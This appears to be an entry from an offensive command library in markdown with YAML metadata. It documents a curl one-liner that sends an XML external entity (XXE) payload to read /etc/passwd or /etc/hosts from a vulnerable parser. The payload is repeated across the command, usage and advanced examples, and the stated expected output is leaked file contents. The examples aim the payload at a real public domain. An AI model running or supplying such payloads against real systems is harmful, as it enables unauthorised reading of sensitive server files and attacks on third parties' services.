---
data: >-
  curl "https://duckduckgo.com/x.js?u=<?xml version=\"1.0\"?><!DOCTYPE foo
  [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
tags:
  - exploitation
  - xxe
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 7c6b19b9-eb77-4773-8cb5-80087feca586
created_at: '2025-12-13T09:00:33.894Z'
updated_at: '2025-12-13T09:00:33.894Z'
verified: false
validated: true
submitted: true
---
# curl-send-xxe-payload

## Command

```bash
curl "https://duckduckgo.com/x.js?u=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
```

## Description

This command sends a crafted XXE payload via curl to exploit vulnerable XML parsers and leak system file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The vulnerable endpoint URL | Yes |
| `payload` | The XXE XML structure | Yes |

## Examples

### Basic Usage

```bash
curl "https://duckduckgo.com/x.js?u=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
```

### Advanced Usage

```bash
curl -v "https://duckduckgo.com/x.js?u=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\" >]><foo>&xxe;</foo>"
```

## Expected Output

Response containing the leaked file contents, such as user lists from /etc/passwd.

## Related
- [[procedures/Exploit-XXE-to-Leak-Files]]
